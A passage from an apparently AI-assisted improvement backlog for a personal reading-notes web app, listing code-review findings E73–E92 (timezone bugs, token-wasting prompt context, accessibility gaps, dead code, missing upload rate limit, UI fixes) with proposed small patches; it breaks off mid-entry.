### E73 — `resolve_user_from_token` writes `last_seen_at = now_iso()` (naive local time) while `gc_expired_sessions` compares a UTC-naive-Z cutoff — sessions survive ~8 extra hours past expiry on UTC+8 servers (S)

**What:** `resolve_user_from_token()` at `app_server.py:1473` executes `conn.execute("UPDATE sessions SET last_seen_at = ? WHERE token = ?", (now_iso(), token))`. `now_iso()` returns naive local time (e.g. `2026-06-12T22:00:00` on UTC+8). `gc_expired_sessions()` at `app_server.py:1481` computes its deletion cutoff as `utc_iso_z_from_epoch(time.time() - days * 86400)` — a UTC-naive-Z string (e.g. `2026-05-13T14:00:00.000000Z`). The SQL comparison `DELETE FROM sessions WHERE last_seen_at < cutoff` compares these two different-timezone strings lexicographically. On UTC+8, naive-local strings are 8h "ahead" of their UTC equivalents (`T22:00` vs `T14:00Z`), so sessions on UTC+8 always appear `+8h` fresher than they actually are — they survive approximately 8 hours past their intended expiry window before GC removes them.

**Why it matters:** Sessions that should expire at T continue to work until T+8h on UTC+8 servers. For the 30-day `SESSION_LIFETIME_DAYS`, the effective session window is 30 days 8 hours instead of 30 days. While low-severity, this is the last remaining naive-time write in the authentication critical path, and it interacts directly with the GC system. Migrating to `utc_now_iso()` (1-character change from `now_iso`) also pairs naturally with E23's threshold-write proposal (reduce write frequency by adding `if time.time() - last_seen_epoch > 300:` guard), so both fixes can land together.

**Complexity:** S — replace `now_iso()` with `utc_now_iso()` at `app_server.py:1473`. Optionally add the 300-second guard from E23 in the same diff. Touch: `app_server.py:1473`.

**Files:** `app_server.py:1473` (`resolve_user_from_token` last_seen_at update); `app_server.py:1466-1474` (session expiry + update block)

---

### E74 — `PromptBuilder.all_books_summary` injected without count limit — 500-book users pay ~8,000 extra tokens per chat request (S)

**What:** `PromptBuilder.build_chat_prompt()` at `app_server.py:2326-2329` always injects `all_books_summary` as the full list of every book in the user's library: `[{"id": b.get("id"), "title": b.get("title"), "author": b.get("author", "")} for b in user_state.get("books", [])]` — no limit. OPT-020 already addressed a similar waste (`existing_connections[:20]` conditionally excluded for book/quote context) but did not cap `all_books_summary`. A power user with 500 books injects ~500 × 3 fields: assuming 16-char IDs, 25-char titles, 15-char authors = ~56 chars per entry × 500 = 28,000 chars ≈ 7,000 tokens added to every chat system prompt, unconditionally. The system instructions (lines 2359, 2363) reference `all_books_summary` IDs only for `link_thought` target selection — and OPT-020's rationale was that `link_thought` is only generated when the user explicitly asks. The `all_books_summary` is therefore wasted for 80%+ of requests in the same way `existing_connections` was.

**Why it matters:** OPT-020 reduced per-request token waste by ~150 tokens and was shipped immediately as a cost saving. The `all_books_summary` issue is proportionally larger: a 500-book user wastes 7,000 tokens/request × 240 requests/day = 1,680,000 tokens/day in redundant book summaries. The fix is the same conditional pattern as OPT-020: cap at `[:50]` (enough for `link_thought` target selection) and only include books beyond the current one for the `link_thought` use case. Alternatively, inject only `{"count": N}` plus the top-10 most-recently-active books as a minimal summary when no `link_thought` use is expected.

**Complexity:** S — change `app_server.py:2326-2329` to cap `all_books_summary` at the 50 most-recently-active books: `[...books_sorted_by_recency...][:50]`. For extra savings, exclude the current book from `all_books_summary` (it's already in the `book` field). This is a 2-line change with zero behavior change for the 95%+ of users with fewer than 50 books. Touch: `app_server.py:2326-2329`.

**Files:** `app_server.py:2312-2331` (`PromptBuilder.build_chat_prompt`); no test changes needed.

---

## 2026-06-13

### E75 — `#chatMessages` div missing `role="log"` — screen readers don't hear incoming AI replies (WCAG 4.1.3 AA) (S)

**What:** `<div id="chatMessages" class="chat-messages chat-messages-inline">` at `index.html:177` carries no `role="log"`, `aria-live`, or `aria-relevant` attribute. A grep across both `index.html` and `chat.js` for "log", "aria-live", and "aria-atomic" returns zero matches inside the chat message region. `chat.js` never calls `setAttribute("aria-live", ...)` on this element anywhere. The existing `a11y-baseline.test.js` tests OPT-013 (button `:focus-visible`), OPT-018 (prefers-reduced-motion), and OPT-019 (`#toast role="status"`) but has no assertion covering `#chatMessages`.

**Why it matters:** The AI replies stream in asynchronously. Without a WCAG 4.1.3 live region, screen readers (VoiceOver on iOS, NVDA/JAWS on desktop) will not announce new messages as they arrive — users must manually navigate into the message list to hear each reply. `role="log"` is the correct ARIA role for this pattern: it implies `aria-live="polite"` + `aria-relevant="additions text"`, so incremental content (each streamed reply) is read aloud once complete without interrupting other announcements. This is identical in character to OPT-019 (toast `role="status"`), which was shipped as P1. Chat is a far higher-traffic surface than the toast.

**Complexity:** S — add `role="log"` to `index.html:177` (1 attribute); add one `test()` block to `tests/frontend/a11y-baseline.test.js` asserting `#chatMessages` carries `role="log"`. No JS or backend changes needed.

**Files:** `index.html:177`; `tests/frontend/a11y-baseline.test.js`

**northstar:** 弱——仅影响屏幕阅读器用户，但延续已有 a11y 系列（OPT-013/018/019/033/046），且 Chat 是 AI 对话核心入口；修复使 AA 级合规在 Chat 模块闭环。→ **promoted to OPT-048**

---

### E77 — Dead-code chain: `openOrganizeDialog()` / `#organizeDialog` / `/api/organize/parse` all reference entities that don't exist (S/M)

**What:** Three verified dead-code artefacts form an incomplete feature scaffold:
1. `app.js:114`: `els.organizeDialog = document.querySelector("#organizeDialog")` — the selector returns `null` because no element with that id exists anywhere in `index.html` (grep confirms zero matches).
2. `app.js:2569-2583`: `function openOrganizeDialog(bookId)` calls `els.organizeDialog.showModal()` — a `null.showModal()` that would throw a `TypeError` if this function were ever invoked.
3. `app.js:2623`: `await apiFetch("/api/organize/parse", { method: "POST", ... })` — there is no handler for this path in `app_server.py` (grep for "organize" in `app_server.py` returns no matches in the request-routing section).

Similarly, `app.js:114` sets `els.candidatesDialog = document.querySelector("#candidatesDialog")` which also resolves to `null` (no `#candidatesDialog` in `index.html`).

**Why it matters:** Dead-code scaffolding (a) misleads future readers who may try to invoke `openOrganizeDialog()` and only discover the crash at runtime; (b) means ~80 lines of JS (`openOrganizeDialog`, `submitOrganizePaste`, and related helpers) are never executed and never tested but must be mentally parsed during every refactor of `app.js`. If this is a planned feature, it needs an OPT item and a backend endpoint; if it was abandoned, removing it reduces the module surface from ~4,500 to ~4,420 lines.

**Complexity:** S to remove (delete the ~80 dead JS lines + 2 null-selector registrations); M to complete (add `#organizeDialog` to `index.html`, add `/api/organize/parse` backend handler, wire up `activateTab` entry point).

**Files:** `app.js:114` (null selector registrations); `app.js:2569-2634` (dead `openOrganizeDialog` + `submitOrganizePaste`); `index.html` (no dialog element present); `app_server.py` (no route handler present)

**northstar:** 弱/无——代码卫生，无直接用户价值。若补全成功能则可能贡献 Theme 2「回顾有价值」（整理/归类摘抄），但前提是明确产品意图。当前建议先确认方向再决定删除还是实现。

---

### E78 — `formatDate()` parses `YYYY-MM-DD` strings as UTC midnight — session dates show one day early for UTC-minus timezone users (S)

**What:** `formatDate()` at `app.js:439-446`:
```
return new Date(dateString).toLocaleDateString("zh-CN", {
  year: "numeric", month: "short", day: "numeric"
});
```
Per the ES2015 spec, `new Date("2026-06-13")` (ISO 8601 date-only) is parsed as `2026-06-13T00:00:00Z` (UTC midnight). On UTC+8 this localizes to `2026-06-13T08:00:00+08:00` — still June 13, correct. But on UTC-5 (US Eastern), this becomes `2026-06-12T19:00:00-05:00` — one day early. `session.date` is stored as a plain `YYYY-MM-DD` string (set directly from `<input type="date">.value`), so the only call sites affected are `renderTimeline()` at `app.js:1374` (`session.date`) and `renderSessions()`. Quote timestamps use full ISO+Z strings (fixed by OPT-014), which parse correctly in all timezones.

**Why it matters:** For the current owner (UTC+8), this is a latent bug that causes no visible symptoms — UTC+8 midnight + 8 hours is still the same day. However, it is a correctness issue for any UTC-minus user who might later share the app (roadmap §1 option B) or access it while traveling. The fix is trivial and future-proof: replace `new Date(dateString)` with `new Date(dateString + "T12:00:00")` to anchor to local noon, or use `.split("-")` to construct the date directly.

**Complexity:** S — change `app.js:441` from `new Date(dateString)` to `new Date(\`${dateString}T12:00:00\`)`. Touch: `app.js:439-446` only; no test changes needed.

**Files:** `app.js:439-446` (`formatDate`); affected call sites: `app.js:1374` (`renderTimeline`), `app.js:1455` (`renderQuotes` — uses full ISO strings, already OK)

**northstar:** 弱——当前唯一用户在 UTC+8，bug 不可见；对未来分享/商业化（路线图 §1 option B/C）是前置正确性修复。P3 候选，不紧急。

---

### E79 — `quoteSearch` and `sessionSearch` trigger full DOM rebuilds on every keystroke with no debounce — inconsistent with the debounced global book search (S)

**What:** `app.js:4069-4070`:
```javascript
els.sessionSearch?.addEventListener("input", renderTimeline);
els.quoteSearch?.addEventListener("input", renderQuotes);
```
Both fire their render function synchronously on every `input` event — no debounce. In contrast, `booksSearchInput` at `app.js:4121-4126` uses a 200ms `setTimeout` debounce before calling `globalSearch()`. `renderQuotes()` at `app.js:1428` performs a full `innerHTML` rebuild of all quote cards on each call, including O(N×M) per-card lookups: `getConnectionCount()` at `app.js:671` filters the entire `state.connections` array for each quote; `getQuoteChatCount()` at `app.js:675` scans `chatHistories`. For a user with 150 quotes and 50 connections, every keystroke costs ~150 × 50 = 7,500 filter comparisons plus a full DOM rebuild.

**Why it matters:** On a mid-range mobile device (iPhone 12, which is the target per CLAUDE.md), rapid typing in the quotes search box will trigger 5-8 rebuilds per second. While the current data scale (50-100 quotes) keeps each rebuild under ~10ms, the inconsistency is an unforced error: the debounce pattern is already established and working for books search. Adding debounce to quote/session search takes 4 lines of JS and makes all three search inputs consistent in behaviour.

**Complexity:** S — wrap both listeners with a `setTimeout`/`clearTimeout` debounce pattern matching `app.js:4121-4126`. No logic changes to render functions needed.

**Files:** `app.js:4069-4070` (listener registrations); no test changes needed

**northstar:** 弱——减少不必要的 DOM 重建，保持 UI 响应流畅；与 Theme 1「采集顺滑」的顺滑感有间接关联。不紧急，但与已有代码模式保持一致的低风险改进。

---

## 2026-06-14

### E80 — `deleteQuote()` 删除摘抄时遗漏 chatHistories / chatContexts 清理，产生孤儿状态 (S)

**What:** `app.js:2316-2332`，`deleteQuote()` 在 `onConfirm` 回调中执行：
```javascript
state.quotes = state.quotes.filter((item) => item.id !== quoteId);
state.connections = (state.connections || []).filter(
  (c) => c.sourceId !== quoteId && c.targetId !== quoteId
);
```
删掉了 quote 本体及其 connections，但未清理 `state.chatHistories["quote:${quoteId}"]` 和 `state.chatContexts["quote:${quoteId}"]`。key 格式由 `app_server.py:608-614` 的 `chat_context_history_key()` 定义：`return f"quote:{normalized['quoteId']}"`.

对比：`deleteBook()` 在 `app.js:2088-2100` 做了完整清理：
```javascript
delete state.chatHistories[bookId];
delete state.chatHistories[`book:${bookId}`];
delete state.chatContexts[bookId];
delete state.chatContexts[`book:${bookId}`];
Object.entries(state.chatContexts).forEach(([key, context]) => {
  if (context?.bookId === bookId) {
    delete state.chatContexts[key];
    delete state.chatHistories[key];
  }
});
```
`deleteQuote()` 没有对应的清理逻辑。

**Why it matters:** 每次删摘抄后，`state.chatHistories` 和 `state.chatContexts` 都会各积累一个死键。这些孤儿键随 `syncState()` 永久写入服务器 SQLite blob，状态随使用次数线性膨胀；若将来 quoteId 被复用（UUID 极小概率但理论存在），旧对话历史会「复活」附着在新摘抄上，导致混乱。

**Complexity:** S — 在 `app.js:2329`（`await syncState()` 之前）插入两行：
```javascript
delete (state.chatHistories || {})["quote:" + quoteId];
delete (state.chatContexts || {})["quote:" + quoteId];
```
Fix mirrors `deleteBook()` pattern exactly.

**Files:** `app.js:2316-2332`（唯一改动点）

**northstar:** 弱——防止 state blob 静默膨胀，属数据健康度修缮。与 Theme 1「采集顺滑」无直接关联，但 state 整洁是一切功能可靠性的基础。P2 候选。

---

### E81 — `a11y-baseline.test.js` 未守卫 OPT-033 的对话框 `aria-labelledby`（已在 PR #34 落地但无回归测试）(S)

**What:** `tests/frontend/a11y-baseline.test.js` 文件头注释明确说明覆盖范围（line 1-2）：
```javascript
// Regression tests for the a11y baseline pass: OPT-018 (prefers-reduced-motion),
// OPT-013 (button :focus-visible), OPT-019 (toast aria-live).
```
全文 54 行，仅含 3 个 test 块，分别验证 OPT-018/013/019。

OPT-033（PR #34，已合并）给 12 个对话框加了 `aria-labelledby` 属性，但没有在此文件新增任何 test 断言。若日后有人重构 `index.html` 中的对话框标签，`aria-labelledby` 属性会静默丢失，无测试拦截。

**Why it matters:** a11y 改动的价值来自「不退化」。OPT-046（tab ARIA，已 triaged）和 OPT-048（chatMessages role，已 triaged）都预期在此文件增加断言——在它们落地前，先为已完成的 OPT-033 补一条基线断言，成本极低（1 个 test 块，3 行有效代码）。

**Complexity:** S — 在 `a11y-baseline.test.js` 新增一个 test 块：断言 `index.html` 中至少一个 `<dialog>` 或 `role="dialog"` 元素含 `aria-labelledby` 属性。具体可检查已知的 `#addBookDialog` 或 `#confirmDialog`（需 grep index.html 确认实际属性值后再写断言）。

**Files:** `tests/frontend/a11y-baseline.test.js`（新增 1 test 块）

**northstar:** 弱——回归安全，防止已有 a11y 工作静默降级。不影响功能，但与整个 a11y 系列（OPT-013/018/019/033/046/048）的长期维护性高度一致。

---

### E82 — `/api/upload-image` 端点无速率限制，与 `/api/books/ocr` 行为不一致 (S)

**What:** `app_server.py:4385-4403`，处理 `/api/upload-image` 的分支：
```python
if parsed.path == "/api/upload-image":
    conn, user = self._require_user()
    if not conn:
        return
    payload = self._read_json()
    # 无 _enforce_rate_limit() 调用
    data_url = str(payload.get("dataUrl", "")).strip()
    ...
    url = save_image(user["id"], data_url, filename)
```
对比同文件 `/api/books/ocr` 端点（line 4455）：
```python
if not self._enforce_rate_limit(conn, user["id"], "ocr"):
    conn.close()
    return
```
OCR 端点有速率限制，图片上传端点没有。

**Why it matters:** `save_image()` 将 base64 数据 decode 后直接写入 `uploads/<user-id>/` 目录。无速率限制意味着认证用户可在短时间内批量 POST 任意数量的图片，耗尽磁盘。当前为个人工具（单用户）风险极低，但若迁移到 option B（小范围分享）场景，此端点成为明显的攻击面。

**Complexity:** S — 在 `_require_user()` 之后插入一行 `_enforce_rate_limit(conn, user["id"], "upload-image")`，复用现有速率限制基础设施。速率阈值参考 OCR 端点配置即可。

**Files:** `app_server.py:4385-4403`（唯一改动点）

**northstar:** 弱/无——安全/可靠性修缮，当前单用户场景无感知收益。若升级到 B/C 定位则为必要前置。P3 候选。

---

### E83 — GDPR 导出的 `exportedAt` 字段使用 `now_iso()`（naive 本地时间），是导出管道最后一个非 UTC 时间戳 (S)

**What:** `app_server.py:3782`：
```python
export = {
    "exportFormat": 1,
    "exportedAt": now_iso(),  # ← naive 本地时间
    ...
}
```
`now_iso()` 在同文件定义（line ~130）返回不带时区的 ISO 8601 字符串（`datetime.now().isoformat()`）。OPT-038（注册时间）、OPT-035（TraceManager）、OPT-031（MCP server）等已逐步将系统其他时间戳迁移至 UTC+Z，`exportedAt` 是导出 payload 中最后一个遗留的 naive 时间字段。

**Why it matters:** 导出文件是用户最重要的数据载体。`exportedAt` 是导入校验和增量备份逻辑的潜在参考字段——若时区偏移不一致，跨时区恢复时会产生歧义。目前仅 owner 单人使用且 UTC+8，问题不可见，但修复成本极低（替换为 `now_utc_iso()` 或等价表达式）。

**Complexity:** S — 将 `app_server.py:3782` 的 `now_iso()` 替换为返回 UTC+Z 格式的辅助函数（`now_utc_iso()` 或 `datetime.now(timezone.utc).isoformat(timespec="milliseconds").replace("+00:00","Z")`）。

**Files:** `app_server.py:3782`（1 行改动）

**northstar:** 弱/无——元数据一致性修缮，与北极星无直接关联。P3 候选，搭便车修。

---

## 2026-06-15

### E84 — `renderTimeline()` 硬限 10 条且无「加载更多」——历史阅读记录只能靠搜索翻阅 (S)

**What:** `app.js:1332`：
```javascript
const sessions = searchRaw
  ? allSorted.filter(...)
  : allSorted.slice(0, 10);   // ← 无 "show more"
```
无搜索时强制截取最近 10 条，`index.html:111` 的 `<div id="timeline">` 旁边没有「加载更多」按钮或分页入口。若用户已记录 30 条阅读（读了 20+ 本书），第 11 条及更早的记录在「记录」Tab 首屏完全不可见，只能通过搜索书名才能翻出来。对比「摘抄」Tab（`renderQuotes()` 渲染全量，`app.js:1428`）和「书单」Tab（`renderBooks()` 分批 rAF 渲染全量）均无截断。

**Why it matters:** 记录 Tab 是 Theme 2「回顾有价值」的主要界面。随着使用积累（1 年 ≈ 100+ 次记录），10 条硬限让历史记录无法浏览；用户必须知道书名才能搜索，不能自由翻阅"上周读了什么"。最小修复：去掉 `.slice(0, 10)`（全量渲染，sessions 总量通常 <200，无性能问题），或加一个「全部 N 条」展开按钮。

**Complexity:** S — 仅改 `app.js:1332` 一行；或加一个展开按钮（+约 10 行 JS，0 行 CSS 新增，复用已有样式）。无后端改动、无 schema 变动。

**Files:** `app.js:1332`（主改动点）；`index.html:111`（可选加展开按钮占位）

**northstar:** 中——Theme 2「回顾有价值」的基础入口：无法浏览历史记录，回顾就无从谈起。是 Theme 2 开始前的前置条件之一（比 OPT-045 的测试覆盖更直接影响用户体验）。

---

### E85 — Session 统计条仅在搜索时显示——日常浏览看不到累计阅读数据 (S)

**What:** `app.js:1335-1342`：
```javascript
if (els.sessionStats) {
  if (searchRaw && sessions.length) {
    // 计算 totalMin / totalPages / count
    els.sessionStats.classList.remove("is-hidden");
  } else {
    els.sessionStats.classList.add("is-hidden"); // ← 无搜索时始终隐藏
  }
}
```
`#sessionStats`（`index.html:110`）仅在有搜索关键词时显示匹配集合的汇总数字。无搜索时（即用户日常打开「记录」Tab 时），统计条始终 `is-hidden`——用户无法在不搜索的情况下看到自己的累计阅读时间或总页数。对比「书单」Tab 顶部的 `renderHero()`（`app.js:934-940`）始终展示总书数/总分钟/总摘抄数。

**Why it matters:** Roadmap §2 的北极星可观测代理指标是「本周使用天数 / 本周新增摘抄数 / 本周回顾操作次数」，能在「记录」Tab 立即看到「共 38 次阅读 · 2140 分钟 · 约 480 页」是养成习惯的正向强化。最小修复：当无搜索时，计算全量 `state.sessions` 的汇总并展示（3 行代码改动）；搜索时继续展示过滤后的子集汇总（现有行为）。

**Complexity:** S — 改 `app.js:1335-1342`，将 `if (searchRaw && sessions.length)` 改为总是显示，无搜索时从 `state.sessions` 全量计算，有搜索时从 `sessions` 过滤结果计算。无 HTML 变更、无 CSS 变更、无后端变更。

**Files:** `app.js:1335-1342`（唯一改动点）

**northstar:** 中——直接佐证 Roadmap §2「可观测代理指标」：让阅读积累可见是「每天爱用」的正向循环基础。在 Theme 2「回顾有价值」启动前的低成本预热。

---

### E86 — 摘抄卡面从不显示图片缩略图——拍照 OCR 后卡面无视觉区分度 (S)

**What:** `renderQuotes()` 中的卡面模板（`app.js:1449-1452`）：
```javascript
<div class="entry-card-cover">
  <div class="entry-cover-fallback"></div>
  <span class="entry-type-chip ...">...</span>
</div>
```
无论 `quote.imageUrl` 是否存在，始终只渲染占位块 `entry-cover-fallback`，不显示图片。对比书卡（`app.js:1133-1134`）：
```javascript
<img src="${coverImage}" alt="${escapeHtml(book.title)}" />
```
会显示封面或摘抄图片 fallback。`openQuoteDetail()`（`app.js:2159-2160`）在详情弹窗中 **确实**加载了图片（`img.src = resolveImageUrl(quote.imageUrl)`），说明图片已上传并有 URL，只是卡面未渲染。

**Why it matters:** Theme 1「采集顺滑」要求拍照→OCR→成卡的全链路可靠且有清晰反馈。拍了照、识别了文字，但成卡后卡面与纯文字卡完全一样（同一个灰色占位块）——用户没有视觉确认"照片已关联到这张卡"。随着 OCR 摘抄增多，整个卡片墙视觉单调、无法区分哪些是图片卡。修复仅需在卡面模板条件渲染一个 `<img>`（类似书卡已有实现），约 3 行。

**Complexity:** S — 在 `app.js:1449` 的 `entry-card-cover` 内条件加 `${quote.imageUrl ? \`<img src="${resolveImageUrl(quote.imageUrl)}" alt="摘抄图片">\` : '<div class="entry-cover-fallback"></div>'}`；CSS 样式沿用已有 `.entry-card-cover img`（书卡已定义）。无后端改动、无测试变更。

**Files:** `app.js:1449-1452`（模板改动）；`styles.css`（如需调整摘抄卡内图片尺寸规则，约 2 行）

**northstar:** 强——直接服务 Theme 1「采集顺滑」：拍照录入是最高频场景，卡面应有视觉确认；与「不假思索的默认工具」北极星一致（完成操作后立即得到正向反馈）。S 复杂度，无副作用。

---

## 2026-06-16

### E87 — 「↓ 最新」按钮独占一个布局行压缩消息区——改为叠加在消息列表上的浮动按钮 (S)

**What:** `index.html:190-192` 中，「↓ 最新」按钮包裹在独立的 `<div class="chat-scroll-btn-row" id="chatScrollBtnRow" hidden>`：

```html
<div class="chat-scroll-btn-row" id="chatScrollBtnRow" hidden>
  <button id="chatScrollBtn" class="chat-scroll-btn" type="button" aria-label="回到最新">↓ 最新</button>
</div>
```

该 div 是 `.chat-panel` flex 列的第三个子元素（夹在 `#chatMessages` 和 `.chat-composer` 之间），`styles.css:2069-2073` 定义为 `display: flex; padding: 4px 4px 0`，可见时占用约 30px 垂直高度。在桌面端（`styles.css:3597-3600`），该 div 同样占 `grid-row: 3`，夹在 `grid-row: 2`（`1fr` messages）和 `grid-row: 4`（composer）之间。由于聊天面板高度固定（`height: min(860px, calc(100dvh - 64px))`），该行出现时直接从 `#chatMessages` 的可用高度里扣除 ~30px。Owner 在 signals 2026-06-16 记录："聊天输入框里「最新」独占一行，挤压了左侧交互内容的空间 → 希望它不占整行"。

**Why it matters:** 「↓ 最新」在用户滚动回看历史消息时出现，此时聊天面板空间已因消息区被占而更紧；弹出后再压缩 30px 会让 composer 区（快捷 chip 行 + 输入框 + 发送键）更拥挤。修复是将该按钮改为 `position: absolute` 叠加在 `#chatMessages` 右下角——这是 WhatsApp/Telegram 等聊天应用的标准模式，不占任何布局空间。

**Complexity:** S — 改 `styles.css`：给 `#chatMessages` 加 `position: relative`，将 `.chat-scroll-btn-row` 改为 `position: absolute; bottom: 8px; right: 8px; z-index: 2`（并移除 `display: flex` 容器改 `display: block`），或直接改按钮本身为 `position: absolute`。同步修改 `chat.js:273, 441, 894`（控制 `scrollBtnRow.hidden` 的逻辑不变）。无 HTML 结构改动，无 JS 逻辑改动。

**Files:** `styles.css:2069-2073`（`.chat-scroll-btn-row` 规则）；`styles.css:3597-3600`（桌面端 grid-row override）

**northstar:** 中——chat 是「探讨」核心入口，输入区舒适度直接影响写作流畅度；owner 真机 signal 驱动，S 复杂度，Theme 1「不假思索的默认工具」辅助。

---

### E88 — 快速 OCR 填入整页全文后无行级删除 UI，用户须手动选删大段内容 (M)

**What:** `index.html:476` 的帮助文本已明确写道："「快速识别」秒出整页全文"。`app.js:511-523` 的 `normalizeOcrText()` 保留 `\n` 分隔的多行结构（`split("\n").map(line=>line.trim()).join("\n")`）。快速 OCR 完成后，`app.js:1554` 将完整识别文本填入 `#quoteContent` textarea：

```javascript
contentEl.value = recognizedText;  // ← 整页全文，可能十几行
```

此后没有任何行级操作 UI——用户必须在 textarea 里手动选中并删除不需要的行，才能保留划线的那一两句。Quote 编辑弹窗（`index.html:444-486`）目前在 OCR 完成后没有提供行选择或批量删除辅助界面。Owner 2026-06-16 signals 记录："快速 OCR 很快但会识别整页全文，只想留划线句，得手动删一大堆很麻烦 → 希望能「一行一行快速删除」OCR 结果"。

**Why it matters:** 这是 Theme 1「采集顺滑」验收标准的直接障碍。拍照→快速 OCR→删到只剩划线句，每次需要额外 20-60 秒手工删除，而 AI 精识别虽可自动提取，但更慢（又回到 OPT-016 的原始痛点）。理想流程：快速 OCR 返回全页文本后，把文本按行展示为可逐行删除的 chip 列表；用户点删不要的行（1-2 次点击），留下的行合并为最终内容；比 textarea 选删更快。

**Complexity:** M — 在 `quoteDialog` 的 OCR 完成路径里新增一个「行选择」UI 组件：`syncOpenQuoteFormFromState()`（`app.js:1548-1556`）检测识别文本行数 ≥ 3 时，隐藏 textarea、展示行列表（每行含删除按钮），「确认行选择」按钮把留下的行合并写回 textarea 并恢复正常编辑模式。需新增约 40 行 JS + 20 行 CSS；无后端改动，无 schema 变更。

**Files:** `app.js:1548-1566`（`syncOpenQuoteFormFromState` OCR done 分支）；`index.html:444-486`（quote dialog 可加行列表 UI 区）；`styles.css`（新增行删除组件样式）

**northstar:** 强——直接驱动 Theme 1「采集顺滑」：快速 OCR 已「快」，但产生整页冗余文本让「顺」失效；owner 真机 signal 2026-06-16 明确指出这是采集摩擦。是现阶段最值得投入的 M 复杂度功能改进。

---

### E89 — `deleteBook` 弹窗仅显示书名，级联删除数量不具体——用户删前不知将失去多少内容 (S)

**What:** `deleteBook()` 在显示确认弹窗前（`app.js:2076`）只将书名写入 `#deleteBookMessage`：

```javascript
els.deleteBookMessage.textContent = book.title;
els.deleteBookDialog.showModal();
```

`index.html:532-533` 中弹窗固定显示通用警告：

```html
<p id="deleteBookMessage" class="delete-confirm-body"></p>
<p class="delete-confirm-warning">⚠️ 同时删除该书的所有阅读记录、摘抄和探讨历史，无法恢复。</p>
```

具体的摘抄数和阅读记录数需到 `onConfirm` 里才计算（`app.js:2084` 的 `deletedQuoteIds`），弹窗显示阶段对用户不可见。

**Why it matters:** 对于有 30+ 张摘抄的书，用户在点击确认前不知道"到底要失去多少"；提前展示具体数量（「将删除「书名」及其 12 条摘抄、5 条阅读记录，无法恢复」）能在第一次显示时就让用户看到量级，大幅减少误删焦虑。修复在 `showModal()` 前先做一次 O(n) 计数（两行 JS），将结果拼入 `deleteBookMessage`。

**Complexity:** S — 在 `app.js:2074-2077` 的 `showModal()` 前新增：
```javascript
const nQuotes = state.quotes.filter(q => q.bookId === bookId).length;
const nSessions = (state.sessions || []).filter(s => s.bookId === bookId).length;
els.deleteBookMessage.textContent = `「${book.title}」及其 ${nQuotes} 条摘抄、${nSessions} 条阅读记录将被永久删除。`;
```
无 HTML 变动（`deleteBookMessage` 已存在），无后端变动。

**Files:** `app.js:2070-2078`（`deleteBook` 函数 showModal 前）；`index.html:532`（可酌情简化固定 warning 文案）

**northstar:** 弱/中——删除是不可逆操作；显示具体数量是「不假思索的默认工具」对数据安全的最低透明度要求。直接改善删除决策质量，与 Theme 1 数据可靠性间接相关。S 复杂度，无风险。

---

### E90 — 摘抄搜索不包含 `reflection`（「我的理解」）字段——用户按自己的思考笔记无法检索 (S)

**What:** `renderQuotes()` 的搜索过滤器（`app.js:1409-1418`）构建 haystack 时：

```javascript
const haystack = [
  book?.title || "",
  book?.author || "",
  item.content || "",      // ← 摘抄原文
  (item.tags || []).join(" "),
].join(" ").toLowerCase();
```

没有包含 `item.reflection`。`index.html:479` 的「我的理解」输入框（`<textarea name="reflection" rows="3">`）是用户记录个人洞察的地方，内容通过 `state.quotes[n].reflection` 持久化。若用户在「我的理解」里写了"这和笛卡尔二元论有关"，在摘抄搜索框输入"笛卡尔"什么都搜不到。

**Why it matters:** `reflection` 是用户最个人化的思考记录，往往比摘抄原文更容易记住（"我当时写了什么？"）。搜索命中 `reflection` 是 Theme 2「回顾有价值」的低成本预热——让自己的洞察变得可检索，才能在日后真正回流到阅读生活。一行修复，零测试变更（可加一条断言）。

**Complexity:** S — 在 `app.js:1411-1416` 的 haystack 数组末尾追加 `item.reflection || ""`。可同时在 `tests/frontend/quote-content-display.test.js` 或 `regression-fixed-bugs.test.js` 追加一条断言。

**Files:** `app.js:1411-1416`（haystack 数组）；可选 `tests/frontend/quote-content-display.test.js`（追加测试）

**northstar:** 中——使用户的个人洞察（reflection）变得可检索，直接支撑 Theme 2「回顾有价值」；累积 50+ 张摘抄后 reflection 检索是最自然的二次入口之一。


---

## 2026-06-17

### E91 — `renderQuotes()` 每张摘抄卡片重复调用 `getConnectionCount` 和 `getQuoteChatCount` 两次，徒增 O(N×M) 遍历 (S)

**What:** `app.js:1457`（`renderQuotes()` 模板字符串内）：

```javascript
${getConnectionCount(quote.id) > 0 ? ` <span class="quote-conn-badge">🔗 ${getConnectionCount(quote.id)}</span>` : ""}${getQuoteChatCount(quote.id) > 0 ? ` <span class="quote-conn-badge">💬 ${getQuoteChatCount(quote.id)}</span>` : ""}
```

两个函数各被调用两次：第一次做 `> 0` 判断，第二次取值嵌入 HTML。`getConnectionCount()`（`app.js:660-669`）遍历 `state.connections` 全量（O(connections)）；`getQuoteChatCount()`（`app.js:671-677`）遍历 `state.chatHistories[bookId]`（O(history)）。每次 `renderQuotes()` 以 N=100 条摘抄、M=50 条 connections 计，产生 200×50=10,000 次比较——实为 `buildRenderCache()`（`app.js:1100-1130`）已为书卡缓存 `connCountMap`（`app.js:1115`）的同类操作，但摘抄卡没有对应缓存。

**Fix:** 在模板外用局部变量计算一次，模板内直接引用：
```javascript
const connCnt = getConnectionCount(quote.id);
const chatCnt = getQuoteChatCount(quote.id);
// 模板中直接用 connCnt / chatCnt
```
仅 `app.js` 改动，无测试变动。

**Complexity:** S — 约 3 行改动，零副作用。

**Files:** `app.js:1450-1460`（`renderQuotes` 模板段）

**northstar:** 低/中——减少无效 CPU 时间，摘抄数量多时（50+ 张）渲染流畅度有感知提升；与 Theme 1「采集顺滑」周边体验相关，但非核心摩擦点。

---

### E92 — `deleteQuote()` 级联删除关联关系时无任何提示，与 `deleteBook()` 的透明度差异明显 (S)

**What:** `app.js:2316-2332`（`deleteQuote()` 函数）：

```javascript
// line 2319 — 当前 confirm 文案：
els.deleteMessage.textContent = "确定删除这张摘抄卡片吗？";
// ...
// line 2322 — 级联删除 connections：
state.connections = (state.connections || []).filter(
  (c) => c.sourceId !== quoteId && c.targetId !== quoteId
);
```

用户看到的对话框文案只问「确定删除这张摘抄卡片吗？」，没有提及该卡片可能已建立的「关联」会一并消失。对比 `deleteBook()`（`app.js:2080-2101`）显示「⚠️ 同时删除该书的所有阅读记录、摘抄和探讨历史，无法恢复。」（`index.html:533`）。关联（connections）是用户手动建立的摘抄间语义链，误删后无法恢复，与摘抄原文一样属于用户数据资产。

**Fix:** 在展示 confirm 对话框前，先计算 `getConnectionCount(quoteId)`，若 > 0 则在文案中追加「及其 N 个关联」——与 E89（deleteBook 显示具体数量）是同类补丁：
```javascript
const connCount = getConnectionCount(quoteId);
const connNote = connCount > 0 ? `及其 ${connCount} 个关联` : "";
